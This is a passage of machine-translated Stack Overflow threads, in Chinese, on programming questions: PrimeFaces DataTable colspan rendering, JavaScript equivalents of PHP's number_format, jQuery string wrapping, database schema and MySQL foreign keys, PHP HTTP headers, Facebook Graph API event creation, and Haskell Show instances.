            boolean selected) throws IOException {
        final ResponseWriter writer = context.getResponseWriter();
        final boolean selectionEnabled = column.getSelectionMode() != null;
        final String style = column.getStyle();
        String styleClass = "";

        if (selectionEnabled) {
            styleClass = DataTable.SELECTION_COLUMN_CLASS;
        } else if (column.getCellEditor() != null) {
            styleClass = DataTable.EDITABLE_COLUMN_CLASS;
        }

        styleClass = column.getStyleClass() == null ? styleClass : styleClass + " " + column.getStyleClass();

        writer.startElement("td", null);
        writer.writeAttribute("role", "gridcell", null);
        if (column.getColspan() != 1) {
            writer.writeAttribute("colspan", column.getColspan(), null);
        }

        if (style != null) {
            writer.writeAttribute("style", style, null);
        }
        if (!isValueBlank(styleClass)) {
            writer.writeAttribute("class", styleClass.trim(), null);
        }

        if (selectionEnabled) {
            writer.startElement("div", null);
            writer.writeAttribute("class", DataTable.COLUMN_CONTENT_WRAPPER, null);
            encodeColumnSelection(context, table, clientId, column, selected);
            writer.endElement("div");
        } else {
            writer.startElement("div", null);
            writer.writeAttribute("class", DataTable.COLUMN_CONTENT_WRAPPER, null);
            column.encodeAll(context);
            writer.endElement("div");
        }

        writer.endElement("td");
    }

    @Override
    protected void encodePaginatorMarkup(FacesContext context, DataTable table, String position, String tag,
            String styleClass) throws IOException {
        final ResponseWriter writer = context.getResponseWriter();
        if (!table.isPaginatorAlwaysVisible() && table.getPageCount() <= 1) {
            return;
        }

        final String id = table.getClientId(context) + "_paginator_" + position;

        writer.startElement("tr", null);
        writer.startElement(tag, null);
        writer.writeAttribute("id", id, null);
        writer.writeAttribute("class", styleClass, null);

        final Integer rowsCount = getMaximumNumberOfColumns(table);

        if (rowsCount == null || (rowsCount != null && rowsCount < table.getColumnsCount())) {
            writer.writeAttribute("colspan", table.getColumnsCount(), null);
        } else {
            writer.writeAttribute("colspan", rowsCount, null);
        }

        final String[] elements = table.getPaginatorTemplate().split(" ");
        for (final String element : elements) {
            final PaginatorElementRenderer renderer = paginatorElements.get(element);
            if (renderer != null) {
                renderer.render(context, table);
            } else {
                writer.write(element + " ");
            }
        }

        writer.endElement(tag);
        writer.endElement("tr");
    }

    @Override
    protected void encodeRowExpansion(FacesContext context, DataTable table) throws IOException {
        final ResponseWriter writer = context.getResponseWriter();
        final Map<String, String> params = context.getExternalContext().getRequestParameterMap();
        final int expandedRowIndex = Integer.parseInt(params.get(table.getClientId(context) + "_expandedRowIndex"));
        final String rowIndexVar = table.getRowIndexVar();

        table.setRowIndex(expandedRowIndex);

        if (rowIndexVar != null) {
            context.getExternalContext().getRequestMap().put(rowIndexVar, expandedRowIndex);
        }

        writer.startElement("tr", null);
        writer.writeAttribute("style", "display:none", null);
        writer.writeAttribute("class", DataTable.EXPANDED_ROW_CONTENT_CLASS + " ui-widget-content", null);

        writer.startElement("td", null);

        final Integer rowsCount = getMaximumNumberOfColumns(table);

        // Fix the number of columns of the second level with its appropriate
        // number of rows
        if (rowsCount == null || (rowsCount != null && rowsCount < table.getColumnsCount())) {
            writer.writeAttribute("colspan", table.getColumnsCount(), null);
        } else {
            writer.writeAttribute("colspan", rowsCount, null);
        }

        table.getRowExpansion().encodeAll(context);

        writer.endElement("td");

        writer.endElement("tr");

        table.setRowIndex(-1);
    }

    // get the maximum number of rows if the datatable can be expanded
    private Integer getMaximumNumberOfColumns(DataTable table) {
        Integer count = null;
        // If the datatable contains a column group it means it can be expanded
        // and contains 2 levels
        if (table.getChildren().get(0) != null && table.getChildren().get(0) instanceof ColumnGroup) {
            final ColumnGroup columnGroup = (ColumnGroup) table.getChildren().get(0);
            if (columnGroup.getChildren().get(1) != null && columnGroup.getChildren().get(1) instanceof Row) {
                final Row row = (Row) columnGroup.getChildren().get(1);
                if (row.getChildren() != null) {
                    count = row.getChildren().size();
                }
            }
        }
        return count;
    } 
```

这是我的视图中包含的“dataTable”部分，它适合被覆盖的函数所处理的行为。

```
<p:columnGroup type="header">
                <p:row>
                    <p:column >
                    </p:column>

                    <p:column headerText="#{bundle.form_name}" filterBy="#{item.name}"
                        sortBy="#{item.name}" colspan="3">
                    </p:column>

                    <p:column headerText="#{bundle.form_designation}"
                        style="width:140px;" filterBy="#{item.designation}"
                        sortBy="#{item.designation}" colspan="2">
                    </p:column>

                    <p:column headerText="#{bundle.form_status}"
                        filterBy="#{item.status}"
                        filterOptions="#{itemStatusListBean.options}">
                    </p:column>

                    <p:column headerText="#{bundle.form_date}"
                        filterBy="#{item.statusDate}" sortBy="#{item.statusDate}">
                    </p:column>
                </p:row>

                <p:row>
                    <p:column />
                    <p:column headerText="Status" />
                    <p:column headerText="Type" />
                    <p:column headerText="Marché" />
                    <p:column headerText="Groupe" />
                    <p:column headerText="Produit" />
                    <p:column headerText="Désignation Produit" />
                    <p:column headerText="EAN" />
                </p:row>
            </p:columnGroup>

            <p:column style="width:4%">
                <p:rowToggler/>
            </p:column>

            <p:column colspan="3">
                <h:outputText value="#{item.name}"  />
            </p:column>

            <p:column colspan="2">
                <h:outputText value="#{item.designation}" />
            </p:column>

            <p:column>
                <h:outputText value="#{item.status.label}" />
            </p:column>

            <p:column>
                <h:outputText value="#{item.statusDate}">
                    <f:convertDateTime pattern="dd/MM/yyyy" timeZone="Europe/Paris" />
                </h:outputText>
            </p:column>

            <p:rowExpansion>
            <p:dataTable id="relationDataTable"
            widgetVar="relationDataTable" var="relation"
            value="#{relationDataTableBean.dataModel}"
            rows="10">
                <p:column></p:column>
                <p:column><h:outputText value="#{relation.status}"/></p:column>
                <p:column><h:outputText value="#{relation.type}"/></p:column>
                <p:column><h:outputText value="#{relation.market}"/></p:column>
                <p:column><h:outputText value="#{relation.group}"/></p:column>
                <p:column><h:outputText value="#{relation.produit}"/></p:column>
                <p:column><h:outputText value="#{relation.desiProduit}"/></p:column>
                <p:column><h:outputText value="#{relation.ean}"/></p:column>

            </p:dataTable>

            </p:rowExpansion> 
```

所以基本上，只需将 colspan 值放入必须从第二级打包的标题列的第一行标题列。
在这种情况下，请检查处理“名称”和“名称”的列。

```
<p:column headerText="#{bundle.form_name}" filterBy="#{item.name}"
                            sortBy="#{item.name}" colspan="3">
                        </p:column>

                        <p:column headerText="#{bundle.form_designation}"
                            style="width:140px;" filterBy="#{item.designation}"
                            sortBy="#{item.designation}" colspan="2">
                        </p:column> 
```

然后，将相同的“colspan”属性和值添加到相应的列索引中，但在 dataTable 主体中（旨在显示对象数据的列）：

```
 <p:column colspan="3">
            <h:outputText value="#{item.name}"  />
        </p:column>

        <p:column colspan="2">
            <h:outputText value="#{item.designation}" />
        </p:column> 
```

我的实现，在某些情况下可能会出现一些默认值，但它在大多数情况下都能正常工作。如果有一天你遇到同样的问题，我希望它会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:39:18.167

尝试插入一个`<h:panelGrid>`或另一个嵌套`<p:dataTable>`在`<p:rowExpansion>`.

它应该创建另一个嵌套在表格单元格内的表格（colspan=5），嵌套单元格上有八列，而主表格只有五列。

HTML 表格在所有行（包括标题）中以最大数量的列呈现，检查[http://www.w3.org/TR/html401/struct/tables.html#h-11.2.4.3](http://www.w3.org/TR/html401/struct/tables.html#h-11.2.4.3)

你的 rowExpansion 看起来像这样：

```
<p:rowExpansion>
<p:dataTable>
    <p:columnGroup>
        <p:row>
            <p:column />
            <p:column headerText="Status" style="width:25px;" />
            <p:column headerText="Type" style="width:25px;" />
            <p:column headerText="Marché" style="width:25px;" />
            <p:column headerText="Groupe" />
            <p:column headerText="Produit" />
            <p:column headerText="Désignation Produit" />
            <p:column headerText="EAN" />
        </p:row>
    </p:columnGroup>
    <p:column></p:column>
    <p:column></p:column>
    <p:column></p:column>
    <p:column></p:column>
    <p:column></p:column>
    <p:column></p:column>
    <p:column></p:column>
</p:dataTable>
</p:rowExpansion> 
```

# php - 什么是JS等价于PHP函数number_format？

> ID：12820312
> 
> 赞同：79
> 
> 时间：2012-10-10T13:18:58.163
> 
> 标签：php, javascript, jquery

PHP函数：

```
function formatNumberForDisplay($number, $decimal=0, $decimalSeperator='.', $numberSeperator=',')
{
     return number_format($number, $decimal, $decimalSeperator, $numberSeperator);
} 
```

任何人都可以向我建议 jQuery/JavaScript 中的等效功能吗？

* * *

## 回答 #1

> 赞同：106
> 
> 时间：2015-12-07T19:42:29.190

[可以在此处](http://phpjs.org/functions/number_format/)找到与 js 中的 number_format 相同的等价物

```
function number_format (number, decimals, dec_point, thousands_sep) {
    // Strip all characters but numerical ones.
    number = (number + '').replace(/[^0-9+\-Ee.]/g, '');
    var n = !isFinite(+number) ? 0 : +number,
        prec = !isFinite(+decimals) ? 0 : Math.abs(decimals),
        sep = (typeof thousands_sep === 'undefined') ? ',' : thousands_sep,
        dec = (typeof dec_point === 'undefined') ? '.' : dec_point,
        s = '',
        toFixedFix = function (n, prec) {
            var k = Math.pow(10, prec);
            return '' + Math.round(n * k) / k;
        };
    // Fix for IE parseFloat(0.55).toFixed(0) = 0;
    s = (prec ? toFixedFix(n, prec) : '' + Math.round(n)).split('.');
    if (s[0].length > 3) {
        s[0] = s[0].replace(/\B(?=(?:\d{3})+(?!\d))/g, sep);
    }
    if ((s[1] || '').length < prec) {
        s[1] = s[1] || '';
        s[1] += new Array(prec - s[1].length + 1).join('0');
    }
    return s.join(dec);
} 
```

* * *

## 回答 #2

> 赞同：50
> 
> 时间：2016-12-15T07:47:07.887

只需`toLocaleString`在整数对象上使用。

[https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Number/toLocaleString#Browser_compatibility](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Number/toLocaleString#Browser_compatibility)

```
let x = 1234567;
//if x is a string/non-number, use parseInt/parseFloat to convert to a number. Thanks @Aleksandr Kopelevich
x.toLocaleString('us', {minimumFractionDigits: 2, maximumFractionDigits: 2}) 
```

* * *

## 回答 #3

> 赞同：49
> 
> 时间：2013-01-15T19:16:22.013

这是你想要得到的吗？

```
yourFloatVarHere.toFixed(2); 
```

瞧。

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2014-12-12T08:01:52.537

本机“国际”对象方法：

```
var amount = 5000.25;
var locale = 'de';
var options = {style: 'currency', currency: 'eur', minimumFractionDigits: 2, maximumFractionDigits: 2};
var formatter = new Intl.NumberFormat(locale, options);

console.log(formatter.format(amount)); 
```

[http://jsfiddle.net/arturrelax/sa9jL138/1/](http://jsfiddle.net/arturrelax/sa9jL138/1/)

更多信息请访问：[https ://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl)

* * *

## 回答 #5

> 赞同：15
> 
> 时间：2017-08-16T08:53:09.970

我知道这是一个旧线程，但我制作了自己的函数，它是纯 Javascript 的。

## **简单的解决方案**

[https://gist.github.com/VassilisPallas/d73632e9de4794b7dd10b7408f7948e8/bf17eccef8521b4e5869bdc6a5b09a771356fbff](https://gist.github.com/VassilisPallas/d73632e9de4794b7dd10b7408f7948e8/bf17eccef8521b4e5869bdc6a5b09a771356fbff)

这适用于有限数字

```
function number_format(number, decimals, dec_point, thousands_point) {

    if (number == null || !isFinite(number)) {
        throw new TypeError("number is not valid");
    }

    if (!decimals) {
        var len = number.toString().split('.').length;
        decimals = len > 1 ? len : 0;
    }

    if (!dec_point) {
        dec_point = '.';
    }

    if (!thousands_point) {
        thousands_point = ',';
    }

    number = parseFloat(number).toFixed(decimals);

    number = number.replace(".", dec_point);

    var splitNum = number.split(dec_point);
    splitNum[0] = splitNum[0].replace(/\B(?=(\d{3})+(?!\d))/g, thousands_point);
    number = splitNum.join(dec_point);

    return number;
} 
```

* * *

## **复杂的解决方案**

这解决了大数字的问题

[https://gist.github.com/VassilisPallas/d73632e9de4794b7dd10b7408f7948e8](https://gist.github.com/VassilisPallas/d73632e9de4794b7dd10b7408f7948e8)

```
 const splitThousands = (number) => (dec_point, thousands_point) => {
  const splitNum = number.toString().split(dec_point);
  splitNum[0] = splitNum[0].replace(/\B(?=(\d{3})+(?!\d))/g, thousands_point);
  return splitNum.join(dec_point);
};

const isBigNumber = (number) => number.toString().includes("e");

const isBigFloat = (number) => number.toString().includes("-");

const calcTrailing = (dec, len) => Number(dec) + 2 - len;

const handleBigFloats = (number, decimals) => {
  if (!decimals) {
    return "0";
  }

  const [numbers, dec] = number.toString().replace(".", "").split("e-");
  const trailingZeros = calcTrailing(dec, numbers.length);
  const res = `${"0.".padEnd(trailingZeros + 2, "0")}${numbers}`;

  return decimals ? res.substring(0, 2) + res.substring(2, decimals + 2) : res;
};

const handleBigNumbers = (number, decimals, dec_point, thousands_point) => {
  if (isBigFloat(number)) {
    return handleBigFloats(number, decimals);
  }

  return splitThousands(BigInt(number))(dec_point, thousands_point);
};

function handleFiniteNumbers(number, decimals, dec_point, thousands_point) {
  if (!isFinite(number)) {
    throw new TypeError("number is not finite number");
  }

  if (!decimals) {
    const len = number.toString().split(".").length;
    decimals = len > 1 ? len : 0;
  }

  return splitThousands(
    parseFloat(number).toFixed(decimals).replace(".", dec_point)
  )(dec_point, thousands_point);
}

const numberFormat = (
  number,
  decimals,
  dec_point = ".",
  thousands_point = ","
) => {
  if (number == null || typeof number !== "number") {
    throw new TypeError("number is not valid");
  }

  if (isBigNumber(number)) {
    return handleBigNumbers(number, decimals, dec_point, thousands_point);
  }

  return handleFiniteNumbers(number, decimals, dec_point, thousands_point);
}; 
```

[https://jsfiddle.net/p2ft9n4v/1/](https://jsfiddle.net/p2ft9n4v/1/)

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2020-01-17T22:08:27.033

更接近 php 的函数`number_format($number)`应该是`number.toLocaleString('en')`javascript

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2016-01-15T18:05:26.463

这是另一个简短的解决方案，它的行为应该类似于 php 等效项。

```
function number_format(number,decimals,dec_point,thousands_sep) {
    number  = number*1;//makes sure `number` is numeric value
    var str = number.toFixed(decimals?decimals:0).toString().split('.');
    var parts = [];
    for ( var i=str[0].length; i>0; i-=3 ) {
        parts.unshift(str[0].substring(Math.max(0,i-3),i));
    }
    str[0] = parts.join(thousands_sep?thousands_sep:',');
    return str.join(dec_point?dec_point:'.');
} 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2014-11-24T12:09:05.090

这是一个简单的函数，您可以使用它在 php 中实现与 number_format 几乎相同的结果：

```
function number_format(user_input){
    var filtered_number = user_input.replace(/[^0-9]/gi, '');
    var length = filtered_number.length;
    var breakpoint = 1;
    var formated_number = '';

    for(i = 1; i <= length; i++){
        if(breakpoint > 3){
            breakpoint = 1;
            formated_number = ',' + formated_number;
        }
        var next_letter = i + 1;
        formated_number = filtered_number.substring(length - i, length - (i - 1)) + formated_number; 

        breakpoint++;
    }

    return formated_number;
} 
```

另一种方法是使用 ajax 调用 php 脚本，在该脚本中对数字运行 number_format 并将 ajax 作为字符串返回。但是有点乱

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-10-10T13:24:48.860

这并不容易，尝试使用简单的 jquery 插件，例如：

[jquery-数字格式化程序](http://code.google.com/p/jquery-numberformatter/)

[Jquery-价格格式](https://github.com/flaviosilveira/Jquery-Price-Format)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-09-27T08:24:55.990

我对此的看法：

```
var number_format = function(num) {
  stringNum = num.toString();
  stringNum = stringNum.split("");
  c = 0;
  if (stringNum.length>3) {
    for (i=stringNum.length; i>-1; i--) {
      if ( (c==3) && ((stringNum.length-i)!=stringNum.length) ) {
        stringNum.splice(i, 0, ",");
        c=0;
      }
      c++
    }
    return stringNum;
  }
  return num;
}

$("body").append(number_format(100000000)); 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2018-12-27T12:31:27.090

暴露示例的另一种变体：

```
const numberFormat = (value, decimals, decPoint, thousandsSep) => {
    decPoint = decPoint || '.';
    decimals = decimals !== undefined ? decimals : 2;
    thousandsSep = thousandsSep || ' ';

    if (typeof value === 'string') {
        value = parseFloat(value);
    }

    let result = value.toLocaleString('en-US', {
        maximumFractionDigits: decimals,
        minimumFractionDigits: decimals
    });

    let pieces = result.split('.');
    pieces[0] = pieces[0].split(',').join(thousandsSep);

    return pieces.join(decPoint);
}; 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-11-02T17:30:38.043

JS 等价物将是：

```
var number = //input value

parseFloat(number).toFixed(3); 
```

* * *

## 回答 #13

> 赞同：-3
> 
> 时间：2019-05-10T12:25:17.857

我要做的只是按如下方式调用 JS 函数并且它可以工作：

```
var formattedNumber = number_format(value) 
```

# javascript - 使用 jQuery 选择和包装某个字符串的所有出现

> ID：12820314
> 
> 赞同：0
> 
> 时间：2012-10-10T13:19:12.000
> 
> 标签：javascript, jquery

在一篇文章的脚注引用列表中，我想选择所有出现的“（en）”并将它们包装起来，以便我可以对它们应用粗体样式以及右边距。

如何用 jQuery 做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:27:07.223

假设您可以将所有数据放入字符串中：

```
var myString = $('#footnotes').html(); 
```

由于您不需要正则表达式，您可以拆分为一个数组并重新加入.. 例如：

```
var newString = myString.split("(en)").join("<span class='en-element'>(en)</span>");
$('#footnotes').html(newString); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:27:45.183

使用正则表达式查找“​​（en）”，然后使用 string.replace 将它们替换为您想要的内容。

我知道什么时候使用正则表达式，但对它的 sintaxys 不太熟悉，所以很抱歉没有提供确切的代码，看看这篇文章，他们试图做同样的事情，但
用 \n 找到并替换它

[jQuery javascript 正则表达式 将 <br> 替换为 \n](https://stackoverflow.com/questions/5959415/jquery-javascript-regex-replace-br-with-n)

# c# - 哪种模式更改方案？

> ID：12820315
> 
> 赞同：0
> 
> 时间：2012-10-10T13:19:12.267
> 
> 标签：c#, sql-server, database-design, schema-design

我当前的架构如下所示：

```
ID | DisplayVal
--   ----------
 1     1-H-3
 2     2-H-3
 3     3-J-4 
```

在上面，该`ID`字段是一个`IDENTITY INT`也用作最终用户的字段`account Id`。这`DisplayVal`就是他们在屏幕上看到的。

一个新客户提供了他们自己的`Account Id`价值观，但他们是`alpha-numeric`，所以他们不能只是进入该`IDENTITY`领域。以下是我的场景： 我正在寻找能够提供最佳`maintainability`、`end user experience`和`magnitude and impact of changes`的场景`testing/QA impact`。

我的第一个场景是添加一个`Account Number`列，该列将是 a`VARCHAR(x)`并容纳所有类型的`Account Numbers`. 它看起来像这样：

```
ID | DisplayVal | AccountNumber
--   ----------   -------------
 1     1-H-3            1
 2     2-H-3            2
 3     3-J-4            3
 4     h389             h389
 5     h-400-x          h400 
```

在上面，在第一个客户端的情况下，`seeded Identity`将`Account Id`被复制到 中`Account Number`，但对于另一个客户端，仍然会`seeded Identity`创建一个，但它们`Account Number`会有所不同，它可能与 . 匹配，也可能不匹配`Display Value`。

我的第二种情况是不添加任何列，对于提供 的客户端`Account Number`，我将关闭`IDENTITY INSERT`并插入新的 Id，然后重新打开身份插入。如果客户没有提供`Account Number`，我会自动生成一个，显然是为了避免冲突。

第三种情况基本上是将新`Account Number`的作为 a`legacy Account Number`并为所有新记录创建新的身份值。这将要求最终用户熟悉新的`Account Number`. 这可能是最简单的，但不确定是否有任何缺点。

如果您知道在这种情况下会很好地工作的另一种情况，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T19:06:25.950

您不应将业务密钥（例如帐户 ID）用作身份。创建一个新的 id 列并使用自动增量字段或 guid 填充它。您的用户或与您的系统交互的其他系统不应知道/依赖此值。

# php - 无法使用 PHP 设置 HTTP 标头

> ID：12820317
> 
> 赞同：0
> 
> 时间：2012-10-10T13:19:17.210
> 
> 标签：php, apache, http, header

> **可能重复：**
> [PHP 已发送的标头](https://stackoverflow.com/questions/8028957/headers-already-sent-by-php)

我正在尝试为我正在制作的应用程序编写 JSON API。它在 PHP 中。在 PHP 脚本的开头，我尝试检查是否所有 GET 参数都存在，如果不存在，则服务器应发送 400 - Bad Request 标头。

代码如下所示：

```
//CHECK CONDITIONS
if (isset($GET["clat"]) && isset($GET["clng"]) && isset($GET["limit"]))
{
//do stuff
} else {
header( "HTTP/1.0 400 Bad Request");
exit;
} 
```

服务器只是提供一个带有 200 - OK 标头的空页面。所以我在另一个网络服务器上对其进行了测试，它似乎确实有效。

所以显然服务器有问题。我该如何解决这个问题？

**编辑** 我似乎找到了导致标题始终为 200-OK 的行。在 PHP 的开头，我包含了另一个带有一些 mySQL 连接参数的 php 文件。当我注释掉该`include 'setup.php';`行时，它起作用了。setup.php 包含以下内容：

```
 // Connects to Our Database 
 mysql_connect("#####", "#####", "######") or die(mysql_error()); 
 mysql_select_db("####") or die(mysql_error()); 
```

如何在之后能够发送不同的 HTTP 标头时保留外部数据库信息？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:11:32.733

检查包含的文件是否在文件开头没有 UTF BOM 以及关闭后的任何文本？>，因为如果有，PHP 会自动发送标头

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:22:41.330

```
header( "HTTP/1.0 400 Bad Request", true, 400); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:23:27.000

试试这个方法：

```
<?php
header("Status: 400 Bad Request");
?> 
```

# php - 如何解析从 Graph Api 返回的数据

> ID：12820322
> 
> 赞同：3
> 
> 时间：2012-10-10T13:19:25.573
> 
> 标签：php, facebook, facebook-graph-api

我有一个使用 Facebook Graph API 创建事件的 PHP 表单 (index.php)。表单用于捕获用户输入，并将此数据 POST 回 API 以创建事件。这与本教程中解释的代码相同：http: [//www.masteringapi.com/tutorials/how-to-create-facebook-events-using-graph-api/49/](http://www.masteringapi.com/tutorials/how-to-create-facebook-events-using-graph-api/49/)

结果是，它返回刚刚创建的事件的 ID。

```
 <?php

    $app_id = "APP_key";
    $app_secret = "APP_secret";
    $my_url = "URL";

    $code = $_REQUEST["code"];

    if(empty($code)) {
    $auth_url = "http://www.facebook.com/dialog/oauth?client_id="
    . $app_id . "&redirect_uri=" . urlencode($my_url)
    . "&scope=create_event";
    echo("<script>top.location.href='" . $auth_url . "'</script>");
    }

    $token_url = "https://graph.facebook.com/oauth/access_token?client_id="
    . $app_id . "&redirect_uri=" . urlencode($my_url)
    . "&client_secret=" . $app_secret
    . "&code=" . $code;
    $access_token = file_get_contents($token_url);

    $event_url = "https://graph.facebook.com/me/events?" . $access_token;

    ?>

    <style>
    label {float: left; width: 100px;}
    input[type=text],textarea {width: 210px;}
    </style>
    </head>
    <body>

    <div id="inputForm"> 
    <form enctype="multipart/form-data" action="<?php echo $event_url; ?>" method="post">
    <p><label for="name">Event Name</label><input type="text" name="name" value="" /></p>
    <p><label for="description">Event Description</label><textarea name="description"></textarea></p>
    <p><label for="location">Location</label><input type="text" name="location" value="" /></p>
    <p><label for="">Start Time</label><input type="text" name="start_time" value="<?php echo date('Y-m-d H:i:s'); ?>" /></p>
    <p><label for="end_time">End Time</label><input type="text" name="end_time" value="<?php echo date('Y-m-d H:i:s', mktime(0, 0, 0, date("m")  , date("d")+1, date("Y"))); ?>" /></p>
    <p><label for="picture">Event Picture</label><input type="file" name="picture" /></p>
    <p>
        <label for="privacy_type">Privacy</label>
        <input type="radio" name="privacy_type" value="OPEN"   checked='checked'/>Open&nbsp;&nbsp;&nbsp;
        <input type="radio" name="privacy_type" value="CLOSED" />Closed&nbsp;&nbsp;&nbsp;
        <input type="radio" name="privacy_type" value="SECRET" />Secret&nbsp;&nbsp;&nbsp;
   </p>
   <p><input type="submit" value="Create Event" /></p>
   </form>
   </div>

   <?php 
```

此代码效果很好，但我正在尝试修改此代码，以便 index.php 将数据发布到 $event_url 以创建事件，但会将您重定向到显示如下消息的确认页面：

“活动成功创建！单击此处访问您的活动”，单击“此处”会将您重定向到 Facebook 上的活动。

关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:39:26.097

更改为您网站上`$event_url`的页面并将其添加为表单上的隐藏字段。`event_submitter.php``access_token`

该`event_submitter`页面应该获取`$_POST`数据，删除`access_token`（如果您使用 php SDK，您可以删除这部分），重新格式化其余`$_POST`数据，通过 cURL 将其发送到 Facebook API 并检查响应。

如果您得到正确的响应，则可以从中生成所需的输出。

# haskell - 如何以小写“显示”构造函数

> ID：12820327
> 
> 赞同：7
> 
> 时间：2012-10-10T13:19:44.060
> 
> 标签：haskell, show

假设我想创建一个新的数据类型并使构造函数可显示，仅以小写而不是它们的大写定义。例如：

```
data Day = Monday | Tuesday | Wednesday| Thursday | Friday | Saturday | Sunday 
```

通过添加*派生 Show*，ghci 会将它们打印为“星期一、星期二……等”。为了让它显示“星期一，星期二..等”，我尝试制作一个特殊的 show 实例：

```
import Data.Char

strToLower :: [Char] -> [Char]
strToLower (x:xs) = toLower x : strToLower xs
strToLower [] = []

instance Show Day where
   show d = strToLower (show d) 
```

show 的第一次出现应该指定我新修改的 show 函数（每次打印时都会调用它），而第二次我打算使用 show 的正常派生版本，从构造函数名称获取字符串。

当然这不起作用（循环定义），因为 ghci 不知道我对“show”这个词的单独含义，但我不知道如何让他知道区别，因为两个版本都需要命名为 show ，第一个是因为这是 print 调用的，第二个是因为它是一个预定义的 haskell 函数，它可以从构造函数名称中给我一个字符串。我试过了

```
show d = strToLower ((showsPrec 0 d) "") 
```

但这归结为相同的循环定义，至少这是我猜测的 ghci 陷入循环。

我理解为什么构造函数名称需要以大写字母开头，但显示它们小写不应该是一个问题，不是吗？我知道我可以为每个案例分别定义我的 show 函数，例如`show Monday = "monday"` `show Tuesday = "tuesday"`等，但我在这里只使用星期几作为示例，我的真实数据类型由 64 个构造函数组成，所以我认为它会更优雅以某种方式解决它。

是否可以深入研究 show 的 haskell 定义并更改该代码的副本？这是我能想到的唯一可能的解决方案，但如果可能的话，我不知道该怎么做。可能不是。所以其他解决方案也非常受欢迎！

感谢您抽出宝贵的时间，

Jelle（Haskell 初学者）

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-10T15:23:46.213

您实际上可以使用`Typeable`和`Data`类来做到这一点。

为此，您需要`DeriveDataTypeable`扩展名，使用`-XDeriveDataTypeable`或通过将以下行放在定义您的类型的文件的开头来打开它：

```
{-# LANGUAGE DeriveDataTypeable #-} 
```

您现在可以导入所需的模块：

```
import Data.Data
import Data.Typeable 
```

并导出`Typeable`和`Data`：

```
data Day = Monday | Tuesday | Wednesday| Thursday | Friday | Saturday | Sunday
     deriving (Typeable, Data) 
```

现在您可以使用`toConstr`来获取构造函数表示：

```
instance Show Day where
   show = strToLower . showConstr . toConstr 
```

但是请参阅其他答案，了解您是否真的想要，而不是简单地使用`showDay`函数或您自己的类型类。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-10T13:44:24.673

该类的实例`Show`应该以这样一种方式工作，即您可以复制粘贴其输出并将其用作 Haskell 代码。如果您现在有小写构造函数，这些将无法正常工作。他们会采用这种`newtype`方法，

```
data DayInternal = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday

newtype Day = Day DayInternal
monday = Day Monday
tuesday = Day Tuesday
wednesday = Day Wednesday
thursday = Day Thursday
friday = Day Friday
saturday = Day Saturday
sunday = Day Sunday

instance Show Day where
    show (Day d) = strToLower $ show d 
```

当然，这会给您留下您可能不喜欢的冗余。您可以使用 Template Haskell 自动构建它，但我怀疑这是否真的值得。

我真正认为的是你想要的根本不是一个`Show`实例，而是某种漂亮的打印。你可以自己动手

```
class MyNiceShow s where
  myNiceShow :: s -> String

data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday
      deriving (Show)

instance MyNiceShow Day where
  myNiceShow d = strToLower $ show d 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-10T13:31:28.183

好吧，不知道您是否可以对相同的数据类型执行此操作，但是我可以看到的一种解决方法是将其包装为新类型

```
newtype D = D Day
instance Show D where
    show (D d) = strToLower $ show d 
```

现在您可以使用 type`D`而不是`Day`.

# mysql - 与mysql外键混淆

> ID：12820337
> 
> 赞同：2
> 
> 时间：2012-10-10T13:20:08.817
> 
> 标签：mysql, database, foreign-keys

我对外键以及它们应该如何工作感到有些困惑。

我在数据库中有 3 个表

```
database = mydb
table parent = user
table child = hobbies
table child2 = skills

*mydb.user have apID as primary and Auto Increment
*mydb.hobbies have apID with relation with mydb.user apID
and hID as auto increment 
*mydb.skills hace apID with relation with mydb.user apID
and sID as auto increment 
```

我很困惑如何插入数据，使爱好和技能中的 apID 相同？兴趣和技能中的哪个关键需要是主要的，外国的还是其他的？

好的，我最终得到

```
INSERT INTO `mydb`.`user` (`appID`, `name`) VALUES (NULL, 'pedro');
INSERT INTO `skills` (`appID`,`dipID`,`name``) VALUES(LAST_INSERT_ID(),NULL,'running') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:55:54.790

是唯一标识表中行的`primary key`列。对于您的用户表，它是公正`apID`的，对于`hobbies`and`skills`表，它是公正的`hID`和`sID`或`hID + apID`与`sID + apID`（取决于您的数据代表什么）。

A`foreign key`是对另一个表中的值的引用。因此，如果您对`apID`in`hobbies`的引用有外键约束，则意味着每个`apID`in都必须有一个匹配的 in 。如果您尝试在其中插入或更新一行以使匹配对消失，MySQL 将抛出错误。`user``apID``hobbies``apID``user``hobbies``user`

该`hobbies`表可能如下所示：

```
CREATE TABLE hobbies (
  hID INT(10) AUTO_INCREMENT NOT NULL,
  apID INT(10),
  PRIMARY KEY (hID, apID),
  FOREIGN KEY (apID) REFERENCES user(apID) ON UPDATE CASCADE
); 
```

